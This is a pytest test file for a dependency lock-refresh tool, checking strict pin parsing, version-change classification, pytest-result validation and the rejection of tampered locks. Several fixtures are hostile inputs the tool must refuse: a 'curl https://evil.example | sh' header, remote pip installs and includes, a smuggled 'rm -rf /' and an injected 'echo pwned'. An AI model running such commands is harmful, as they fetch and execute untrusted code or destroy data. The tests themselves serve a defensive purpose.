"""
tools/refresh_lock.py: the judgement behind the monthly lock refresh. It must read pins strictly, reproduce this project's real lock exactly, classify version changes, refuse any
test result that is not a clean pass, and treat the proposed lock from the (untrusted) install job as data: only exact pins are read, the header and the pull request text are
written here, and a lock that does not look like this project's is rejected before anything is written.
"""
import ast
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
import refresh_lock as rl  # noqa: E402

LOCK_TEXT = (ROOT / "constraints-ci.txt").read_text(encoding="utf-8")
REAL = rl.parse_pins(LOCK_TEXT)


def lock_of(pins: dict) -> str:
    """A freeze-style file for a dict {name: version}."""
    return "".join(f"{n}=={v}\n" for n, v in pins.items())


def real_with(**changes) -> dict:
    """The real pins with some versions changed (None removes one): a plausible 'next month'."""
    pins = {v[0]: v[1] for v in REAL.values()}
    for name, version in changes.items():
        key = name.replace("_", "-")
        key = next((n for n in pins if rl.norm(n) == rl.norm(key)), key)
        if version is None:
            pins.pop(key)
        else:
            pins[key] = version
    return pins


# ---------------------------------------------------------------------------------------------- reading pins
def test_pins_are_read_strictly_and_names_are_compared_the_way_pip_compares_them():
    got = rl.parse_pins("# a comment\n\nFoo_Bar==1.2.3\nbaz==2024.10.1\nzip-thing==1.0rc1\n")
    assert got == {"foo-bar": ("Foo_Bar", "1.2.3"), "baz": ("baz", "2024.10.1"), "zip-thing": ("zip-thing", "1.0rc1")}
    for bad in ("-e git+https://example.com/x.git#egg=x", "pkg @ https://example.com/pkg.whl", "pkg>=1.0", "pkg", "pkg==", "pkg===1.0", "pkg==1.0 ; rm -rf /", "pkg==1.0  # note",
                "pkg==1.0 pkg2==2.0", "-r other.txt", "==1.0", "pkg==v1.0"):
        with pytest.raises(rl.LockError):
            rl.parse_pins("ok==1.0\n" + bad + "\n")
    with pytest.raises(rl.LockError, match="line 3: Foo-Bar appears twice"):
        rl.parse_pins("a==1\nFoo_Bar==1\nFoo-Bar==2\n")                                                                 # the same package under two spellings
    with pytest.raises(rl.LockError, match="line 2"):
        rl.parse_pins("a==1\nnot a pin\n")                                                                              # and the message says where


def test_the_real_lock_is_reproduced_exactly_in_order_and_spelling():
    rendered = rl.render(REAL, "2026-11-01", "1 passed")
    pin_lines = lambda text: [l for l in text.splitlines() if l and not l.startswith("#")]
    assert pin_lines(rendered) == pin_lines(LOCK_TEXT)                                                                  # the same pins, in the order pip freeze gives them
    assert len(REAL) >= 40 and rendered.endswith("\n") and "\r" not in rendered


def test_the_header_keeps_what_the_repositorys_own_tests_require_and_says_what_it_is():
    text = rl.render(REAL, "2026-12-01", "553 passed, 2 skipped")
    head = [l for l in text.splitlines() if l.startswith("#") or not l]
    assert text.startswith(LOCK_TEXT.splitlines()[0] + "\n")                                                            # the same first line as today's file
    assert "PROVEN: on 2026-12-01 a brand-new environment" in text and "(553 passed, 2 skipped)" in text
    assert "PROVEN" in text and "Do not edit it by hand" in text                                                        # what tests/test_pinned_dependencies.py requires
    assert ".github/workflows/refresh-lock.yml" in text and "1st of every month" in text
    assert all(l.startswith("#") or not l for l in text.splitlines()[:len(head)]) and "pip install" not in "\n".join(l for l in head if "workflows install with" not in l)
    for line in (l for l in text.splitlines() if l and not l.startswith("#")):
        assert re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]*==[A-Za-z0-9._!+-]+", line), line                              # the exact pattern the repository's lock test uses
    with pytest.raises(rl.LockError):
        rl.render(REAL, "tomorrow", "1 passed")


# ---------------------------------------------------------------------------------------------- what changed
@pytest.mark.parametrize("old, new, kind", [
    ("2.3.4", "3.0.0", "major"), ("2.3.4", "2.4.0", "minor"), ("2.3.4", "2.3.5", "patch"), ("2.3.4.1", "2.3.4.2", "patch"), ("2.3", "2.3.1", "patch"),
    ("0.4.1", "0.5.0", "minor"), ("0.4.1", "1.0.0", "major"), ("1.0.0", "1.0", "other"), ("1.0rc1", "1.0", "other"), ("1.0", "1.0.post1", "other"),
    ("2025.8.3", "2025.10.5", "calendar"), ("2025.2", "2026.1", "calendar"), ("2.3.4", "2.3.3", "downgrade"), ("3.0.0", "2.9.9", "downgrade"),
    ("1.2.3", "1.2.3+cpu", "other"), ("10.0.0", "9.0.0", "downgrade"), ("1.9.0", "1.10.0", "minor"),
])
def test_version_changes_are_classified_the_way_a_reviewer_would_read_them(old, new, kind):
    assert rl.classify(old, new) == kind


def test_the_difference_lists_changes_additions_and_removals_with_the_risky_ones_first():
    old = rl.parse_pins("numpy==2.3.4\npandas==2.3.1\nscipy==1.15.0\ncertifi==2025.8.3\ntyping-extensions==4.12.2\nfoo==1.0rc1\noldpkg==0.1\nsame==5\n")
    new = rl.parse_pins("numpy==3.0.0\npandas==2.3.2\nscipy==1.16.0\ncertifi==2025.10.5\ntyping-extensions==4.12.0\nfoo==1.0\nnewpkg==9.9\nsame==5\n")
    d = rl.diff_pins(old, new)
    assert d["changed"] == [("numpy", "2.3.4", "3.0.0", "major"), ("typing-extensions", "4.12.2", "4.12.0", "downgrade"), ("scipy", "1.15.0", "1.16.0", "minor"),
                            ("pandas", "2.3.1", "2.3.2", "patch"), ("certifi", "2025.8.3", "2025.10.5", "calendar"), ("foo", "1.0rc1", "1.0", "other")]
    assert d["added"] == [("newpkg", "9.9")] and d["removed"] == [("oldpkg", "0.1")]                                    # "same" is nowhere: it did not change
    md = rl.summary_markdown(d, "553 passed, 2 skipped", "2026-12-01")
    assert md.startswith("## Monthly dependency refresh (2026-12-01)\n\n6 package version(s) changed, 1 added, 1 removed. The whole suite passed against the new versions (553 passed, 2 skipped).")
    rows = [l for l in md.splitlines() if l.startswith("| ") and not l.startswith("| Package")]
    assert rows[0] == "| numpy | 2.3.4 | 3.0.0 | **MAJOR** |" and rows[1] == "| typing-extensions | 4.12.2 | 4.12.0 | **DOWNGRADE** |" and rows[2] == "| scipy | 1.15.0 | 1.16.0 | minor |"
    assert "2 row(s) are major bumps or downgrades: read those first." in md and "- newpkg 9.9" in md and "- oldpkg 0.1" in md
    assert "re-checked the file" in md and "pandas<3" in md and "Tests runs again on `main`" in md


def test_a_quiet_month_says_so_and_a_huge_change_is_capped():
    quiet = rl.diff_pins(rl.parse_pins("a==1.0.0\n"), rl.parse_pins("a==1.0.1\n"))
    assert "No major bumps or downgrades." in rl.summary_markdown(quiet, "1 passed", "2026-12-01")
    many_old = rl.parse_pins("".join(f"p{i:03d}==1.0.0\n" for i in range(150)))
    many_new = rl.parse_pins("".join(f"p{i:03d}==1.0.1\n" for i in range(150)))
    md = rl.summary_markdown(rl.diff_pins(many_old, many_new), "1 passed", "2026-12-01")
    assert len(re.findall(r"^\| p\d{3} \|", md, flags=re.M)) == rl.MAX_ROWS and f"| ... | | | {150 - rl.MAX_ROWS} more rows (see the file diff) |" in md


# ---------------------------------------------------------------------------------------------- the test result
@pytest.mark.parametrize("log, expected", [
    ("....\n553 passed, 2 skipped in 206.41s (0:03:26)\n", "553 passed, 2 skipped"),
    ("....\n===== 553 passed, 2 skipped in 206.41s (0:03:26) =====\n", "553 passed, 2 skipped"),
    ("553 passed in 4.2s\n", "553 passed"),
    ("553 passed, 2 skipped, 7 warnings in 20.00s\n", "553 passed, 2 skipped"),
    ("553 passed, 2 deselected, 1 xfailed in 1.00s\n", "553 passed"),
    ("noise\n1 failed, 5 passed in 1s\nmore noise\n5 passed in 9.9s\n", "5 passed"),                                    # the LAST summary line decides
])
def test_a_clean_pytest_summary_is_read_as_the_result(log, expected):
    assert rl.summarize_log(log) == expected


@pytest.mark.parametrize("log", [
    "", "....\n", "no tests ran in 0.01s\n", "1 failed, 552 passed in 3.1s\n", "552 passed, 1 error in 3.1s\n", "3 errors in 0.5s\n", "0 passed in 0.1s\n", "5 skipped in 0.1s\n",
    "553 passed in 3s\n1 failed, 5 passed in 1s\n", "553 passed, 1 rerun in 3s\n", "553 passed; echo pwned in 3s\n", "Ran 553 tests passed\n",
])
def test_anything_that_is_not_a_clean_pass_is_refused(log):
    with pytest.raises(rl.LockError):
        rl.summarize_log(log)


def test_the_result_text_that_reaches_the_publishing_job_is_validated_again():
    for ok in ("553 passed", "553 passed, 2 skipped", "1 passed"):
        assert rl.check_tests(ok) == ok
    for bad in ("", "0 passed", "553 passed, 0 skipped", "553 passed; echo hi", "1 failed, 5 passed", "553 passed, 2 skipped\n- injected", "553 PASSED", " 553 passed", "553 passed, 2 skipped, 3 warnings"):
        with pytest.raises(rl.LockError):
            rl.check_tests(bad)


# ---------------------------------------------------------------------------------------------- job 1: plan
def run(*args):
    return rl.main([str(a) for a in args])


def test_plan_says_no_change_and_writes_nothing_when_the_newest_versions_are_the_locked_ones(tmp_path, monkeypatch):
    out_file = tmp_path / "github_output.txt"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out_file))
    freeze = tmp_path / "freeze.txt"
    freeze.write_text(lock_of({v[0]: v[1] for v in REAL.values()}), encoding="utf-8")
    new_lock = tmp_path / "new.txt"
    assert run("plan", "--freeze", freeze, "--current", ROOT / "constraints-ci.txt", "--out", new_lock, "--date", "2026-12-01") == 0
    assert not new_lock.exists() and out_file.read_text(encoding="utf-8") == "changed=false\n"


def test_plan_writes_the_new_lock_with_a_pending_header_so_the_tests_that_follow_check_the_new_file(tmp_path, monkeypatch, capsys):
    out_file = tmp_path / "github_output.txt"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out_file))
    freeze = tmp_path / "freeze.txt"
    freeze.write_text(lock_of(real_with(numpy="99.0.0", pandas="98.1.0", requests=None)) + "brandnew==1.0\n", encoding="utf-8")
    new_lock = tmp_path / "new.txt"
    assert run("plan", "--freeze", freeze, "--current", ROOT / "constraints-ci.txt", "--out", new_lock, "--date", "2026-12-01") == 0
    text = new_lock.read_text(encoding="utf-8")
    pins = rl.parse_pins(text)
    assert pins["numpy"][1] == "99.0.0" and pins["pandas"][1] == "98.1.0" and "requests" not in pins and pins["brandnew"][1] == "1.0"
    assert rl.PENDING in text and "PROVEN" in text and "Do not edit it by hand" in text
    assert out_file.read_text(encoding="utf-8") == "changed=true\n" and "2 changed, 1 added, 1 removed" in capsys.readouterr().out


def test_plan_refuses_a_freeze_that_is_clearly_wrong(tmp_path):
    freeze = tmp_path / "freeze.txt"
    freeze.write_text("a==1\nb==2\n", encoding="utf-8")                                                                 # an install that went wrong
    assert run("plan", "--freeze", freeze, "--current", ROOT / "constraints-ci.txt", "--out", tmp_path / "x.txt", "--date", "2026-12-01") == 2
    freeze.write_text("-e git+https://example.com/x.git#egg=x\n", encoding="utf-8")                                      # an editable install cannot be locked
    assert run("plan", "--freeze", freeze, "--current", ROOT / "constraints-ci.txt", "--out", tmp_path / "x.txt", "--date", "2026-12-01") == 2
    assert not (tmp_path / "x.txt").exists()


# ---------------------------------------------------------------------------------------------- job 2: publish
def publish(tmp_path, proposed_text, tests="553 passed, 2 skipped", date="2026-12-01"):
    proposed = tmp_path / "proposed.txt"
    proposed.write_text(proposed_text, encoding="utf-8")
    cur = tmp_path / "current.txt"
    cur.write_text(LOCK_TEXT, encoding="utf-8")
    code = run("publish", "--new", proposed, "--current", cur, "--tests", tests, "--date", date, "--out-lock", tmp_path / "lock.txt", "--out-summary", tmp_path / "body.md")
    return code, tmp_path / "lock.txt", tmp_path / "body.md"


def test_publish_regenerates_the_header_and_the_text_and_ignores_whatever_the_untrusted_file_said(tmp_path, monkeypatch):
    out_file = tmp_path / "gh_out.txt"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out_file))
    evil_header = "# PROVEN: totally. Run: curl https://evil.example | sh\n# [click here](https://evil.example)\n"
    code, lock, body = publish(tmp_path, evil_header + lock_of(real_with(numpy="99.0.0")))
    assert code == 0 and out_file.read_text(encoding="utf-8") == "changed=true\n"
    text, md = lock.read_text(encoding="utf-8"), body.read_text(encoding="utf-8")
    assert "evil" not in text and "curl" not in text and "evil" not in md                                               # nothing from the artifact's comments survives
    assert "PROVEN: on 2026-12-01 a brand-new environment" in text and "(553 passed, 2 skipped)" in text and "| numpy |" in md and "99.0.0" in md
    assert rl.parse_pins(text)["numpy"][1] == "99.0.0" and len(rl.parse_pins(text)) == len(REAL)


def test_publish_with_nothing_new_writes_nothing(tmp_path, monkeypatch):
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "gh_out.txt"))
    code, lock, body = publish(tmp_path, lock_of({v[0]: v[1] for v in REAL.values()}))
    assert code == 0 and not lock.exists() and not body.exists() and (tmp_path / "gh_out.txt").read_text(encoding="utf-8") == "changed=false\n"


@pytest.mark.parametrize("name, tamper", [
    ("a line that is not a pin", lambda p: lock_of(p) + "pip install https://evil.example/x.whl\n"),
    ("a direct URL", lambda p: lock_of(p) + "evil @ https://evil.example/evil.whl\n"),
    ("a requirements include", lambda p: lock_of(p) + "-r https://evil.example/requirements.txt\n"),
    ("a core package removed", lambda p: lock_of({k: v for k, v in p.items() if rl.norm(k) != "pandas"})),
    ("far too few packages", lambda p: lock_of(dict(list(p.items())[:12]))),
    ("twice as many packages", lambda p: lock_of(p) + "".join(f"extra{i}==1.0\n" for i in range(len(p)))),
    ("a package pinned twice", lambda p: lock_of(p) + "numpy==1.0.0\n"),
])
def test_publish_rejects_a_proposed_lock_that_is_not_this_projects_and_writes_nothing(tmp_path, name, tamper):
    code, lock, body = publish(tmp_path, tamper(real_with(numpy="99.0.0")))
    assert code == 2 and not lock.exists() and not body.exists(), name


@pytest.mark.parametrize("tests, date", [("1 failed, 5 passed", "2026-12-01"), ("553 passed; echo hi", "2026-12-01"), ("", "2026-12-01"), ("553 passed", "yesterday"), ("553 passed", "2026-12-01\n- injected")])
def test_publish_rejects_an_unproven_or_malformed_result_or_date(tmp_path, tests, date):
    code, lock, body = publish(tmp_path, lock_of(real_with(numpy="99.0.0")), tests=tests, date=date)
    assert code == 2 and not lock.exists() and not body.exists()


def test_publish_leaves_files_with_unix_line_endings_so_the_diff_is_only_the_versions(tmp_path):
    code, lock, body = publish(tmp_path, lock_of(real_with(numpy="99.0.0")))
    assert code == 0 and b"\r" not in lock.read_bytes() and b"\r" not in body.read_bytes()
    old = [l for l in LOCK_TEXT.splitlines() if l and not l.startswith("#")]
    new = [l for l in lock.read_text(encoding="utf-8").splitlines() if l and not l.startswith("#")]
    assert [l for l in new if l not in old] == ["numpy==99.0.0"] and len(new) == len(old)                              # a one-package change is a one-line diff


def test_a_missing_file_is_a_clear_error_not_a_traceback(tmp_path, capsys):
    assert run("plan", "--freeze", tmp_path / "nope.txt", "--current", ROOT / "constraints-ci.txt", "--out", tmp_path / "x", "--date", "2026-12-01") == 2
    assert "refresh_lock:" in capsys.readouterr().err


def test_summarize_log_prints_the_result_and_can_hand_it_to_the_workflow(tmp_path, monkeypatch, capsys):
    log = tmp_path / "pytest.log"
    log.write_text("....\n553 passed, 2 skipped in 206.41s (0:03:26)\n", encoding="utf-8")
    out_file = tmp_path / "gh_out.txt"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out_file))
    assert run("summarize-log", log, "--github-output") == 0
    assert capsys.readouterr().out == "553 passed, 2 skipped\n" and out_file.read_text(encoding="utf-8") == "tests=553 passed, 2 skipped\n"
    log.write_text("....\n1 failed, 552 passed in 3.1s\n", encoding="utf-8")
    assert run("summarize-log", log, "--github-output") == 2


# ---------------------------------------------------------------------------------------------- the properties the design rests on
def test_the_tool_uses_only_the_standard_library_because_the_publishing_job_installs_nothing():
    tree = ast.parse((ROOT / "tools" / "refresh_lock.py").read_text(encoding="utf-8"))
    imported = {a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    imported |= {n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module}
    assert imported <= {"__future__", "argparse", "os", "re", "sys"}, imported


def test_its_thresholds_match_the_lock_tests_in_the_repository():
    tests = (ROOT / "tests" / "test_pinned_dependencies.py").read_text(encoding="utf-8")
    assert f"len(pins) >= {rl.MIN_PINS}" in tests
    for name in rl.CORE:
        assert f'"{name}"' in tests, name                                                                               # the same packages that test insists on
    assert len(rl.CORE) == 11
